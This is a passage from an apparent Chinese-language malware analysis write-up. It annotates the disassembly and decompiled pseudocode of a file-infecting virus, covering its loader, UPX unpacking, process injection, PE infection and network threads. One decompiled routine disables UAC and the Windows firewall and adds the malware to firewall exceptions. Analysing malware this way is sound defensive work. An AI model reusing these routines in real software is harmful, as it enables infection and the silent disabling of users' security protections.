+0040236E     8B5B 08                       MOV  EBX,DWORD PTR DS:[EBX+8]        ; kernel.基地址
+00402371     F8                             CLC
+00402372     EB 0A                          JMP  SHORT 0040237E
+00402374     8B5B 34                       MOV  EBX,DWORD PTR DS:[EBX+34]
+00402377     8D5B 7C                       LEA  EBX,DWORD PTR DS:[EBX+7C]
+0040237A     8B5B 3C                       MOV  EBX,DWORD PTR DS:[EBX+3C]
+0040237D     F8                             CLC
+0040237E     66:813B 4D5A                  CMP  WORD PTR DS:[EBX],5A4D           ; kernel
+00402383     74 05                          JE   SHORT 0040238A
+00402385     E9 46010000                   JMP  004024D0
+0040238A     8BF3                           MOV  ESI,EBX
+0040238C     0376 3C                       ADD  ESI,DWORD PTR DS:[ESI+3C]        ; 地址  Pe
+0040238F     813E 50450000                 CMP  DWORD PTR DS:[ESI],4550          ; esi  == PE_NtHeader
+00402395     74 05                          JE   SHORT 0040239C
+00402397     E9 34010000                   JMP  004024D0
+0040239C     899D 22144000                 MOV  DWORD PTR SS:[EBP+401422],EBX      ; kernel 基地址
+004023A2     8D85 3E144000                 LEA  EAX,DWORD PTR SS:[EBP+40143E]
+004023A8     50                             PUSH EAX                        ; loadlibrary
+004023A9     FFB5 22144000                 PUSH DWORD PTR SS:[EBP+401422]      ; kernelＢａｓｅ
+004023AF     E8 E8010000                   CALL 0040259C                  ; ＧｅｔＰｒｏｃＡｄｄｒｅｓｓ
+004023B4     E8 BD010000                   CALL 00402576                  ; ｒｅｔ
+004023B9     8985 4D144000                 MOV  DWORD PTR SS:[EBP+40144D],EAX      ; EAX=7C801D4F (kernel32.LoadLibraryExA)
+004023BF     8D85 2B144000                 LEA  EAX,DWORD PTR SS:[EBP+40142B]
+004023C5     50                             PUSH EAX
+004023C6     FFB5 22144000                 PUSH DWORD PTR SS:[EBP+401422]
+004023CC     E8 CB010000                   CALL 0040259C
+004023D1     E8 A0010000                   CALL 00402576
+004023D6     8985 3A144000                 MOV  DWORD PTR SS:[EBP+40143A],EAX      ; EAX=7C80AC28 (kernel32.GetProcAddress)
+004023DC     8D85 82164000                 LEA  EAX,DWORD PTR SS:[EBP+401682]      ; 地址=00402998, (ASCII "KERNEL32.DLL")
+004023E2     6A 00                          PUSH 0
+004023E4     6A 00                          PUSH 0
+004023E6     50                             PUSH EAX
+004023E7     FF95 4D144000                 CALL DWORD PTR SS:[EBP+40144D]
+004023ED     E8 84010000                   CALL 00402576
+004023F2     8985 22144000                 MOV  DWORD PTR SS:[EBP+401422],EAX      ; EAX=7C800000 (kernel32.7C800000)
+004023F8     8DBD 51144000                 LEA  EDI,DWORD PTR SS:[EBP+401451]      ; 地址=00402767, (ASCII "CloseHandle")
+004023FE     8B95 22144000                 MOV  EDX,DWORD PTR SS:[EBP+401422]      ; SS:[00402738]=7C800000 (kernel32.7C800000)
+00402404     E8 72010000                   CALL 0040257B                  ; Iat 构建
+
+    __Proc 0040257B
+
+0040257B     8BF7                           MOV  ESI,EDI
+0040257D     32C0                           XOR  AL,AL
+0040257F     AE                             SCAS BYTE PTR ES:[EDI]
+00402580   ^ 75 FD                          JNZ  SHORT 0040257F             ; 字符串末尾定位地址存放处
+00402582     52                             PUSH EDX                         ; EDX=7C800000 (kernel32.7C800000)
+00402583     56                             PUSH ESI                         ; ESI=00402767 (virus.00402767), ASCII "CloseHandle"
+```
+
+
+
+```
+00402584    52                              PUSH EDX                            ; EDX=7C800000 (kernel32.7C800000)
+
+00402585    FF95 3A144000                   CALL DWORD PTR SS:\[EBP+40143A\]
+
+0040258B    E8 E6FFFFFF                     CALL 00402576
+
+00402590    8907                            MOV DWORD PTR DS:\[EDI\],EAX      ; 构建ｉａｔ
+
+00402592    5A                              POP EDX
+
+00402593    83C7 04                         ADD EDI,4
+
+00402596    803F FF                         CMP BYTE PTR DS:\[EDI\],0FF
+
+00402599  ^ 75 E0                           JNZ SHORT 0040257B
+
+0040259B    C3                              RETN
+
+00402409    68 02800000                     PUSH 8002
+
+0040240E    FF95 A7144000                   CALL DWORD PTR SS:\[EBP+4014A7\]  ; SetErrorCOde
+
+00402414    8DBD 60164000                   LEA EDI,DWORD PTR SS:\[EBP+401660\] ; 地址=00402976, (ASCII "hh8geqpHJTkdns6")
+
+0040241A    57                              PUSH EDI
+
+0040241B    68 00800000                     PUSH 8000
+
+00402420    33C0                            XOR EAX,EAX
+
+00402422    50                              PUSH EAX
+
+00402423    6A 04                           PUSH 4
+
+00402425    50                              PUSH EAX
+
+00402426    48                              DEC EAX
+
+00402427    50                              PUSH EAX
+
+00402428    FF95 74144000                   CALL DWORD PTR SS:\[EBP+401474\]
+
+0040242E    8DBD 4C164000                   LEA EDI,DWORD PTR SS:\[EBP+40164C\]
+
+00402434    57                              PUSH EDI                          ; 地址=00402962, (ASCII "purity_control_7728")
+
+00402435    68 00540100                     PUSH 15400
+
+0040243A    6A 00                           PUSH 0
+
+0040243C    6A 04                           PUSH 4
+
+0040243E    6A 00                           PUSH 0
+
+00402440    6A FF                           PUSH -1
+
+00402442    FF95 74144000                   CALL DWORD PTR SS:\[EBP+401474\]  ; SS:\[0040278A\]=7C80946C (kernel32.CreateFileMappingA)
+
+00402448    85C0                            TEST EAX,EAX                    ; 20h 句柄
+
+0040244A    74 3A                           JE SHORT 00402486               ; 为空表明失败
+
+0040244C    68 00540100                     PUSH 15400
+
+00402451    6A 00                           PUSH 0
+
+00402453    6A 00                           PUSH 0
+
+00402455    6A 06                           PUSH 6
+
+00402457    50                              PUSH EAX
+
+00402458    FF95 F9144000                   CALL DWORD PTR SS:\[EBP+4014F9\] ; SS:\[0040280F\]=7C80B78D (kernel32.MapViewOfFile)
+
+0040245E    85C0                            TEST EAX,EAX                    ; 00380000  pvoidFile
+
+00402460    74 24                           JE SHORT 00402486
+
+00402462    8985 8F164000                   MOV DWORD PTR SS:\[EBP+40168F\],EAX ; pFilePury_control
+
+00402468    80BD 73274000 01               CMP BYTE PTR SS:\[EBP+402773\],1 ; 全局标志符号 初始为 1
+
+0040246F    75 15                           JNZ SHORT 00402486
+
+00402471    B9 ECE80000                     MOV ECX,0E8EC
+
+00402476    8DB5 00104000                   LEA ESI,DWORD PTR SS:\[EBP+<&KERNEL32.Sleep>\]
+
+0040247C    8BF8                            MOV EDI,EAX                   ; pFilePury_control
+
+0040247E    8B06                            MOV EAX,DWORD PTR DS:\[ESI\]  ; DS:\[00402316\]=000000E8
+
+00402480    3907                            CMP DWORD PTR DS:\[EDI\],EAX
+
+00402482    74 02                           JE SHORT 00402486
+
+00402484    F3:A4                           REP MOVS BYTE PTR ES:\[EDI\],BYTE PTR DS:\[ESI\] ; 复制指令 由本代码 00402316 开始 复制 e8ec 字节 代码到 pFilePury_control 镜像文件中去  esi = 38e8ec  ;也就是本页面的代码 就是这个 Pe 的主题线程代码
+
+00402486    8D85 93164000                   LEA EAX,DWORD PTR SS:\[EBP+401693\]
+
+0040248C    50                              PUSH EAX                          ; 地址=004029A9
+
+0040248D    6A 00                           PUSH 0
+
+0040248F    89AD 93164000                   MOV DWORD PTR SS:\[EBP+401693\],EBP ; 重定位差值
+
+00402495    FFB5 93164000                   PUSH DWORD PTR SS:\[EBP+401693\] ; 1316
+
+0040249B    8D85 D1164000                   LEA EAX,DWORD PTR SS:\[EBP+4016D1\]
+
+004024A1    50                              PUSH EAX                          ; EAX=004029E7 (virus.004029E7)  ThreadProc
+
+004024A2    6A 00                           PUSH 0
+
+004024A4    6A 00                           PUSH 0
+
+004024A6    FF95 96144000                   CALL DWORD PTR SS:\[EBP+401496\] ; SS:\[004027AC\]=7C81082F (kernel32.CreateThread)
+
+004024AC    80BD 73274000 00               CMP BYTE PTR SS:\[EBP+402773\],0
+
+004024B3    75 0A                           JNZ SHORT 004024BF
+
+004024B5    6A FF                           PUSH -1
+
+004024B7    FF95 03154000                   CALL DWORD PTR SS:\[EBP+401503\]
+
+004024BD  ^ EB ED                           JMP SHORT 004024AC
+
+004024BF    6A 0C                           PUSH 0C
+
+004024C1    FF95 03154000                   CALL DWORD PTR SS:\[EBP+401503\] ; SS:\[00402819\]=7C802442 (kernel32.Sleep) 转换线程
+
+004024C7    83BD C9164000 01               CMP DWORD PTR SS:\[EBP+4016C9\],1
+
+004024CE  ^ 75 DC                           JNZ SHORT 004024AC                ; 通过标志通信是否完全处理好线程工作
+
+004024D0    83BD 74274000 01               CMP DWORD PTR SS:\[EBP+402774\],1
+
+004024D7    0F85 8C000000                  JNZ 00402569
+
+    __ThreadProc 处理手动 loader upx 程序 并执行，我们直接弄出来
+
+004029E7    C8 000000                       ENTER 0,0                           ; ThreadProc Parameter 1316
+
+004029EB    8B6D 08                         MOV EBP,DWORD PTR SS:\[EBP+8\]       ; 1316
+
+004029EE    80BD 73274000 01               CMP BYTE PTR SS:\[EBP+402773\],1     ; 重定位 需要 懂了吧~~~  Ps:此处一看就是标志作用，里应外合
+
+004029F5    0F85 FB000000                  JNZ 00402AF6
+
+004029FB    8B8D 74274000                  MOV ECX,DWORD PTR SS:\[EBP+402774\] ; 改变标志
+
+00402A01    49                              DEC ECX
+
+00402A02    85C9                            TEST ECX,ECX
+
+00402A04    74 0F                           JE SHORT 00402A15
+
+00402A06    41                              INC ECX
+
+00402A07    8DB5 78274000                  LEA ESI,DWORD PTR SS:\[EBP+402778\]
+
+00402A0D    8BBD 54124000                  MOV EDI,DWORD PTR SS:\[EBP+401254\]
+
+00402A13    F3:A4                           REP MOVS BYTE PTR ES:\[EDI\],BYTE PTR DS:\[ESI\]
+
+00402A15    89AD 411E4000                  MOV DWORD PTR SS:\[EBP+401E41\],EBP ; 60 bd
+
+00402A1B    89AD 341D4000                  MOV DWORD PTR SS:\[EBP+401D34\],EBP
+```
+
+
+
+```
+00402A21    89AD 0F1E4000                    MOV DWORD PTR SS:[EBP+401E0F],EBP  
+
+00402A27    89AD 731E4000                    MOV DWORD PTR SS:[EBP+401E73],EBP  
+
+00402A2D    89AD DD1D4000                    MOV DWORD PTR SS:[EBP+401DDD],EBP  
+
+00402A33    8D85 78274000                    LEA EAX,DWORD PTR SS:[EBP+402778]                 ; 地址=00403A8E : 路径 C:\...\virus.exe  
+
+00402A39    68 FE010000                      PUSH 1FE  
+
+00402A3E    50                               PUSH EAX                                        ; EAX=00403A8E (virus.00403A8E)  
+
+00402A3F    6A 00                            PUSH 0  
+
+00402A41    FF95 1A154000                    CALL DWORD PTR SS:[EBP+40151A]                   ; GetModuleFile  
+
+00402A47    85C0                             TEST EAX,EAX                                    ; 00000036: length Path  
+
+00402A49    74 2E                            JE SHORT 00402A79  
+
+00402A4B    8BC8                             MOV ECX,EAX  
+
+00402A4D    48                               DEC EAX  
+
+00402A4E    83BC05 78274000 00               CMP DWORD PTR SS:[EBP+EAX+402778],0  
+
+00402A56    74 10                            JE SHORT 00402A68  
+
+00402A58    80BC05 78274000 5C               CMP BYTE PTR SS:[EBP+EAX+402778],5C  
+
+00402A60    75 03                            JNZ SHORT 00402A65  
+
+00402A62    40                               INC EAX  
+
+00402A63    EB 03                            JMP SHORT 00402A68  
+
+00402A65    48                               DEC EAX                                         ; 一直得到 名字的第一位 Index  
+
+00402A66   ^ EB E6                           JMP SHORT 00402A4E  
+
+00402A68    8DBD DA1F4000                    LEA EDI,DWORD PTR SS:[EBP+401FDA]                ; 地址=004032F0 可能为一块缓冲区  
+
+00402A6E    8DB405 78274000                  LEA ESI,DWORD PTR SS:[EBP+EAX+402778]            ; 得到名字 ：地址=00403ABB, (ASCII "virus.exe")  
+
+00402A75    2BC8                             SUB ECX,EAX  
+
+00402A77    F3:A4                            REP MOVS BYTE PTR ES:[EDI],BYTE PTR DS:[ESI]     ; 复制名字 到 004032f0  
+
+00402A79    8BBD 54124000                    MOV EDI,DWORD PTR SS:[EBP+401254]                ; SS:[0040256A]=00401010 (virus.<ModuleEntryPoint>)  
+
+00402A7F    2BBD 37234000                    SUB EDI,DWORD PTR SS:[EBP+402337]  
+
+00402A85    89BD CD164000                    MOV DWORD PTR SS:[EBP+4016CD],EDI                ; edi: 装载基地址 MyBaseAddrEDI=00400000 (virus.00400000)  
+
+00402A8B    33C9                             XOR ECX,ECX  
+
+00402A8D    B1 05                            MOV CL,5  
+
+00402A8F    8D95 3B234000                    LEA EDX,DWORD PTR SS:[EBP+40233B]                ; 地址=00403651  
+
+00402A95    80F9 05                          CMP CL,5  
+
+00402A98    75 06                            JNZ SHORT 00402AA0  
+
+00402A9A    8DB5 DB1D4000                    LEA ESI,DWORD PTR SS:[EBP+401DDB]                ; 地址=004030F1  
+
+00402AA0    80F9 04                          CMP CL,4  
+
+00402AA3    75 06                            JNZ SHORT 00402AAB  
+
+00402AA5    8DB5 711E4000                    LEA ESI,DWORD PTR SS:[EBP+401E71]                ; 00403187  
+
+00402AAB    80F9 03                          CMP CL,3  
+
+00402AAE    75 06                            JNZ SHORT 00402AB6  
+
+00402AB0    8DB5 3F1E4000                    LEA ESI,DWORD PTR SS:[EBP+401E3F]                ; 地址=00403155  
+
+00402AB6    80F9 02                          CMP CL,2  
+
+00402AB9    75 06                            JNZ SHORT 00402AC1  
+
+00402ABB    8DB5 311D4000                    LEA ESI,DWORD PTR SS:[EBP+401D31]                ; 地址=00403047  
+
+00402AC1    80F9 01                          CMP CL,1  
+
+00402AC4    75 06                            JNZ SHORT 00402ACC  
+
+00402AC6    8DB5 0D1E4000                    LEA ESI,DWORD PTR SS:[EBP+401E0D]                ; 地址=00403123  
+
+00402ACC    33DB                             XOR EBX,EBX  
+
+00402ACE    B3 04                            MOV BL,4  
+
+00402AD0    8B02                             MOV EAX,DWORD PTR DS:[EDX]                      ; DS:[00403651]=00000000  
+
+00402AD2    85C0                             TEST EAX,EAX  
+
+00402AD4    74 04                            JE SHORT 00402ADA  
+
+00402AD6    03C7                             ADD EAX,EDI  
+
+00402AD8    8930                             MOV DWORD PTR DS:[EAX],ESI  
+
+00402ADA    83C2 04                          ADD EDX,4  
+
+00402ADD    4B                               DEC EBX  
+
+00402ADE    85DB                             TEST EBX,EBX  
+
+00402AE0    74 02                            JE SHORT 00402AE4  
+
+00402AE2   ^ EB EC                           JMP SHORT 00402AD0                              ; 循环 4 次  测试是否为 0  不为 0 填充 esi 数据  
+
+00402AE4    49                               DEC ECX  
+
+00402AE5    85C9                             TEST ECX,ECX  
+
+00402AE7    74 02                            JE SHORT 00402AEB  
+
+00402AE9   ^ EB AA                           JMP SHORT 00402A95  
+
+00402AEB    B8 01000000                      MOV EAX,1  
+
+00402AF0    8985 C9164000                    MOV DWORD PTR SS:[EBP+4016C9],EAX                ; 标记  
+
+00402AF6    8D85 70164000                    LEA EAX,DWORD PTR SS:[EBP+401670]  
+
+00402AFC    50                               PUSH EAX                                        ; 地址=00402986, (ASCII "uxJLpe1m")  
+
+00402AFD    6A 00                            PUSH 0  
+
+00402AFF    6A 00                            PUSH 0  
+
+00402B01    FF95 85144000                    CALL DWORD PTR SS:[EBP+401485]                   ; SS:[0040279B]=7C80EB3F (kernel32.CreateMutexA)  
+
+00402B07    50                               PUSH EAX  
+
+00402B08    8985 C5164000                    MOV DWORD PTR SS:[EBP+4016C5],EAX                ; hMutex:28h  
+
+00402B0E    FF95 E7144000                    CALL DWORD PTR SS:[EBP+4014E7]  
+
+00402B14    83F8 00                          CMP EAX,0                                       ; 保持一个实例运行  
+
+00402B17    76 13                            JBE SHORT 00402B2C  
+
+00402B19    FF95 5D144000                    CALL DWORD PTR SS:[EBP+40145D]  
+
+00402B1F    68 10270000                      PUSH 2710  
+
+00402B24    FF95 03154000                    CALL DWORD PTR SS:[EBP+401503]  
+
+00402B2A   ^ EB CA                           JMP SHORT 00402AF6  
+
+00402B2C    58                               POP EAX                                         ; hMutex  
+
+00402B2D    8D95 EC444000                    LEA EDX,DWORD PTR SS:[EBP+4044EC]                ; 地址=00405802  Pe 格式的文件  
+
+00402B33    80BD 73274000 00                 CMP BYTE PTR SS:[EBP+402773],0                 ; 标志 首次运行为 1  
+
+00402B3A    75 0C                            JNZ SHORT 00402B48  
+
+00402B3C    8B95 8F164000                    MOV EDX,DWORD PTR SS:[EBP+40168F]  
+
+00402B42    81C2 EC340000                    ADD EDX,34EC  
+
+00402B48    66:813A 4D5A                     CMP WORD PTR DS:[EDX],5A4D  
+
+00402B4D    0F85 54020000                    JNZ 00402DA7  
+
+00402B53    8B42 3C                          MOV EAX,DWORD PTR DS:[EDX+3C]  
+
+00402B56    03D0                             ADD EDX,EAX  
+```
+
+
+
+```
+00402B58    66:813A 5045                    CMP WORD PTR DS:[EDX],4550
+00402B5D    0F85 44020000                   JNZ 00402DA7
+00402B63    8995 93164000                   MOV DWORD PTR SS:[EBP+401693],EDX             ; PE_Nt_header:EDX=004058DA (virus.004058DA), ASCII "PE" 看数据 是 upx 壳文件，由于之前做了一部分加密，所以现在可以提取试试
+00402B69    81C2 F8000000                   ADD EDX,0F8                                     ; PE_header + f8h :upx0
+00402B6F    8B85 93164000                   MOV EAX,DWORD PTR SS:[EBP+401693]
+00402B75    8B40 34                         MOV EAX,DWORD PTR DS:[EAX+34]                   ; ImageBase:DS:[0040590E]=00400000 (virus.00400000)
+00402B78    8985 9B164000                   MOV DWORD PTR SS:[EBP+40169B],EAX               ; ImageBase:DS:[0040590E]=00400000 (virus.00400000)
+00402B7E    8B85 93164000                   MOV EAX,DWORD PTR SS:[EBP+401693]
+00402B84    66:8B40 06                      MOV AX,WORD PTR DS:[EAX+6]                      ; NumberOfSection :003
+00402B88    25 FFFF0000                     AND EAX,0FFFF                                   ; 清除高位
+00402B8D    8985 A3164000                   MOV DWORD PTR SS:[EBP+4016A3],EAX               ; NumberOfSection :003
+00402B93    8B85 93164000                   MOV EAX,DWORD PTR SS:[EBP+401693]
+00402B99    8B40 50                         MOV EAX,DWORD PTR DS:[EAX+50]                   ; sizeOfImage:DS:[0040592A]=000B9000
+00402B9C    05 00010000                     ADD EAX,100
+00402BA1    6A 40                           PUSH 40
+00402BA3    68 00300000                     PUSH 3000
+00402BA8    05 00000001                     ADD EAX,1000000
+00402BAD    50                              PUSH EAX                                          ; EAX=010B9100
+00402BAE    6A 00                           PUSH 0
+00402BB0    FF95 B8144000                   CALL DWORD PTR SS:[EBP+4014B8]                  ; SS:[004027CE]=7C809A81 (kernel32.VirtualAlloc)
+00402BB6    85C0                            TEST EAX,EAX
+00402BB8    0F84 E9010000                   JE 00402DA7
+00402BBE    8985 97164000                   MOV DWORD PTR SS:[EBP+401697],EAX               ; EAX=00520000
+00402BC4    B9 00B40000                     MOV ECX,0B400
+00402BC9    8DB5 EC444000                   LEA ESI,DWORD PTR SS:[EBP+4044EC]
+00402BCF    80BD 73274000 00                CMP BYTE PTR SS:[EBP+402773],0
+00402BD6    75 0C                           JNZ SHORT 00402BE4
+00402BD8    8BB5 8F164000                   MOV ESI,DWORD PTR SS:[EBP+40168F]
+00402BDE    81C6 EC340000                   ADD ESI,34EC
+00402BE4    8BBD 97164000                   MOV EDI,DWORD PTR SS:[EBP+401697]
+00402BEA    F3:A4                           REP MOVS BYTE PTR ES:[EDI],BYTE PTR DS:[ESI]     ; 复制 pe 文件 前面部分
+00402BEC    FF8D A3164000                   DEC DWORD PTR SS:[EBP+4016A3]                   ; 处理块区
+00402BF2    8B95 93164000                   MOV EDX,DWORD PTR SS:[EBP+401693]
+00402BF8    81C2 F8000000                   ADD EDX,0F8
+00402BFE    52                              PUSH EDX
+00402BFF    8B85 A3164000                   MOV EAX,DWORD PTR SS:[EBP+4016A3]
+00402C05    BB 28000000                     MOV EBX,28
+00402C0A    F7E3                            MUL EBX
+00402C0C    5A                              POP EDX
+00402C0D    03D0                            ADD EDX,EAX
+00402C0F    8B42 08                         MOV EAX,DWORD PTR DS:[EDX+8]
+00402C12    8985 A7164000                   MOV DWORD PTR SS:[EBP+4016A7],EAX
+00402C18    8B42 0C                         MOV EAX,DWORD PTR DS:[EDX+C]
+00402C1B    8985 AB164000                   MOV DWORD PTR SS:[EBP+4016AB],EAX
+00402C21    8B42 10                         MOV EAX,DWORD PTR DS:[EDX+10]
+00402C24    8985 AF164000                   MOV DWORD PTR SS:[EBP+4016AF],EAX
+00402C2A    8D85 EC444000                   LEA EAX,DWORD PTR SS:[EBP+4044EC]
+00402C30    80BD 73274000 00                CMP BYTE PTR SS:[EBP+402773],0
+00402C37    75 0B                           JNZ SHORT 00402C44
+00402C39    8B85 8F164000                   MOV EAX,DWORD PTR SS:[EBP+40168F]
+00402C3F    05 EC340000                     ADD EAX,34EC
+00402C44    0342 14                         ADD EAX,DWORD PTR DS:[EDX+14]
+00402C47    8985 B3164000                   MOV DWORD PTR SS:[EBP+4016B3],EAX
+00402C4D    8BB5 B3164000                   MOV ESI,DWORD PTR SS:[EBP+4016B3]
+00402C53    8BBD AB164000                   MOV EDI,DWORD PTR SS:[EBP+4016AB]
+00402C59    03BD 97164000                   ADD EDI,DWORD PTR SS:[EBP+401697]
+00402C5F    8B8D AF164000                   MOV ECX,DWORD PTR SS:[EBP+4016AF]
+00402C65    F3:A4                           REP MOVS BYTE PTR ES:[EDI],BYTE PTR DS:[ESI]     ; 复制过去
+00402C67    83BD A3164000 00                CMP DWORD PTR SS:[EBP+4016A3],0
+00402C6E    0F85 78FFFFFF                   JNZ 00402BEC                                    ; 以上是装载块区
+00402C74    8B85 93164000                   MOV EAX,DWORD PTR SS:[EBP+401693]
+00402C7A    8B80 A0000000                   MOV EAX,DWORD PTR DS:[EAX+A0]                   ; 第一块的地址 rva upx0， 到这里我们就可以直接把文件 从内存里 dump 出来，直接分析关键
+00402C80    85DB                            TEST EBX,EBX
+00402C82    74 6D                           JE SHORT 00402CF1
+00402C84    0385 97164000                   ADD EAX,DWORD PTR SS:[EBP+401697]               ; SS:[004029AD]=00520000 装载后的 pe 只想 upx0 第一块
+00402C8A    8985 9F164000                   MOV DWORD PTR SS:[EBP+40169F],EAX
+00402C90    8B85 97164000                   MOV EAX,DWORD PTR SS:[EBP+401697]
+00402C96    8BD0                            MOV EDX,EAX                                     ; EAX=00520000
+00402C98    8BD8                            MOV EBX,EAX                                     ; EAX=00520000
+00402C9A    2B95 9B164000                   SUB EDX,DWORD PTR SS:[EBP+40169B]               ; 重定位特征
+```
+
+#### Upx 脱壳分析
+
+后面是真正的动作，我们看 `upx` ...
+
+`---upx` 脱壳 ，继续调试，手脱部分就不写了。太多了
+
+#### 整体逻辑伪代码
+
+先看整体部分：
+
+```
+SetErrorMode(0x8002u);
+
+WSAStartup(2u, &WSAData);
+
+InitializeCriticalSection(&CriticalSection);
+
+InitializeCriticalSection(&struCriticalSection1);
+
+InitializeCriticalSection(&struCriticalSection2);
+
+hiewOpenAndPrevent(v0);
+
+v1 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)productInjectCodeAndInjectEvery, 0, 0, &ThreadId);
+
+WaitObject(v1, 0, 0);
+
+v2 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)FuckSaftySoftInR0AndR3, 0, 0, &ThreadId);
+
+WaitObject(v2, 0, 0);
+
+v3 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)genericPeFileAndInfect, 0, 0, &ThreadId);
+
+WaitObject(v3, 0, 0);
+
+v4 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)genericPeFileByBufferBeforeAndDelete, 0, 0, &ThreadId);
+
+WaitObject(v4, 0, 0);
+
+v5 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)recycleAndInjectExeAndDeletedir, 0, 0, &ThreadId);
+
+WaitObject(v5, 0, 0);
+
+v6 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)waitObjectRecycle, 0, 0, &ThreadId);
+
+WaitObject(v6, 0, 0);
+
+v7 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)netCommunicatestart, 0, 0, &ThreadId);
+```
+
+
+
+```
+WaitObject(v7, 0, 0);
+
+v8 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)SendbySocket, 0, 0, &ThreadId);
+
+WaitObject(v8, 0, 0);
+
+v9 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)getData, 0, 0, &ThreadId); // 后面三个是网络传输线程配合
+
+WaitObject(v9, 0, 0);
+
+while ( 1 )
+
+Sleep(0x200u);
+
+}
+```
+
+我整理了一下 只看重点：具体就看 `ida` （自认为注释的差不多有的可以还原了）
+
+### 1. `hiewOpenAndPrevent`
+
+关于服务的开启禁止 以及文件唯一随即命名的方式
+
+```
+if ( !RegOpenKeyExA(HKEY_LOCAL_MACHINE, off_4016D4, 0, 0xF003Fu, &hKey) )
+
+ {
+
+  (*_DWORD *)nSize = 0;
+
+  RegSetValueExA(hKey, strEnableLUA, 0, 4u, nSize, 4u);
+
+  RegCloseKey(hKey);
+
+ }
+
+ lstrcpyA(&SubKey, strShare);
+
+ lstrcatA(&SubKey, strAuthorizeApplication);
+
+ if ( !RegOpenKeyExA(HKEY_LOCAL_MACHINE, &SubKey, 0, 0xF003Fu, &hKey) )
+
+ {
+
+  GetModuleFileNameA(0, &strModuleName, 0x200u);
+
+  wsprintfA(&SubKey, strPartStripsec, &strModuleName);
+
+  subLen = lstrlenA(&SubKey);
+
+  RegSetValueExA(hKey, &strModuleName, 0, 1u, (const BYTE *)&SubKey, subLen);
+
+  RegCloseKey(hKey);                   // 注册表添加模块主允许
+
+ }
+
+ if ( !RegOpenKeyExA(HKEY_LOCAL_MACHINE, strShare, 0, 0xF003Fu, &hKey) )
+
+ {
+
+  (*_DWORD *)nSize = 0;
+
+  RegSetValueExA(hKey, strEnableFireWall, 0, 4u, nSize, 4u);
+
+  (*_DWORD *)nSize = 0;
+
+  RegSetValueExA(hKey, strDonotAllowExcep, 0, 4u, nSize, 4u);
+
+  (*_DWORD *)nSize = 1;
+
+  RegSetValueExA(hKey, strDisableNotify, 0, 4u, nSize, 4u);
+
+  RegCloseKey(hKey);                   // 关闭防火墙，和 禁止掉 一些 警告语
+
+ }
+
+ GetWindowsDirectoryA(strWindowsDir, 0x104u);
+
+ if ( (*_BYTE *)(lstrlenA(strWindowsDir) + 0x4394E3) != '\\' )
+
+ lstrcatA(strWindowsDir, "\\");
+
+ (*_DWORD *)nSize = 128;
+
+ GetComputerNameA(&SubKey, (LPDWORD)nSize);    // 获取计算机名称
+
+ if ( lstrlenA(&SubKey) > 2 )
+
+ {
+
+ LOBYTE(v24) = SubKey;
+
+ LOBYTE(v23) = *(&v41 + lstrlenA(&SubKey));
+
+ nullsub_1 = (unsigned __int8)v23 * (unsigned __int8)v24 + 1060;
+
+ }
+
+ lstrcpyA((LPSTR)&String2, "Software\\");
+
+ (*_DWORD *)nSize = 128;
+
+ GetUserNameA(&SubKey, (LPDWORD)nSize);
+
+ if ( lstrlenA(&SubKey) < 4 )
+
+ lstrcpyA(&SubKey, strMonga_bonga);           // 小于 4 用自己的名称
+
+ CopyBufferByLen(&dword_4394E0, &SubKey, 4);
+
+ for ( i = 0; ; ++i )
+
+ {
+
+ v3 = lstrlenA(&SubKey);
+
+ if ( i >= v3 )
+
+  break;
+
+ if ( i >= 0x10 )
+
+  break;
+
+ (*_DWORD *)nSize = ((unsigned __int8)dword_4394E0 ^ i) + *(&SubKey + i);
+
+ if ( (*_DWORD *)nSize < 0 )
+
+  (*_DWORD *)nSize = -(*_DWORD *)nSize;
+
+ *(&String2 + lstrlenA(&String2)) = nSize[0] % 0x19u + (i > 0 ? 97 : 65);// 将加密的计算机名字 接到 SoftWare 后面
+
+ }                                   // 上面这一 for 循环主要是 加密计算机名字
+
+ if ( GenerateRadomNameFile(strWindowsDir) )   // 产生随即名字，并打开文件利用 createfile 测试是否是唯一的
+
+ {
+
+ lstrcpyA((LPSTR)&strRandomFileName, strWindowsDir);
+
+ }
+
+ else
+
+ {
+
+ GetTempPathA(0xE4u, (LPSTR)&strRandomFileName);
+
+ if ( byte_4396EB[lstrlenA(&strRandomFileName)] != '\\' )
+
+ lstrcatA((LPSTR)&strRandomFileName, "\\");
+
+ if ( !GenerateRadomNameFile(&strRandomFileName) )
+
+ lstrcpyA((LPSTR)&strRandomFileName, off_401684);
+
+ }
+
+ for ( i = 0; ; ++i )
+
+ {
+
+ v4 = lstrlenA(&SubKey);
+
+ if ( i >= v4 )
+
+  break;
+
+ if ( i >= 0x10 )
+
+  break;
+
+ (*_DWORD *)nSize = dword_4394E0 * ((unsigned __int8)dword_4394E0 ^ i) + *(&SubKey + i);// 解密计算机名称
+
+ if ( (*_DWORD *)nSize < 0 )
+
+  (*_DWORD *)nSize = -(*_DWORD *)nSize;
+
+ *(&strRandomFileName + lstrlenA(&strRandomFileName)) = nSize[0] % 0x19u + 97;// 加到即将生产的文件后面去命名
+
+ }
+
+ lstrcatA((LPSTR)&strRandomFileName, strDotLog);// 到这里 就完成随即命名生产.log 后缀的文件名
+
+ hFileMappingControlPury = CreateFileMappingA((HANDLE)0xFFFFFFFF, 0, 4u, 0, 0x15400u, strMappingFile);
+```
+
+### 2. `productInjectCodeAndInjectEvery`
+
+远程注入 主题 `Mapping` 的 `code` 进行注入 ，注入前注意有对函数地址的修正，就是硬编码修正，看 `ida` 注释很详细
+
+```
+BOOL __cdecl injectEveryModule()
+
+{
+
+ DWORD pid; // ST08_4@7
+
+ int v1; // eax@7
+
+ HANDLE v2; // ST14_4@7
+
+ DWORD v3; // ST08_4@14
+
+ int v4; // eax@14
+
+ HANDLE v5; // ST10_4@14
+
+ PROCESSENTRY32 pe; // [sp+Ch] [bp-234h]@2
+
+ HANDLE hSnapshot; // [sp+134h] [bp-10Ch]@1
+
+ DWORD v9; // [sp+138h] [bp-108h]@1
+
+ CHAR String; // [sp+13Ch] [bp-104h]@1
+
+ char v11[256]; // [sp+13Dh] [bp-103h]@1
+
+ __int16 v12; // [sp+23Dh] [bp-3h]@1
+
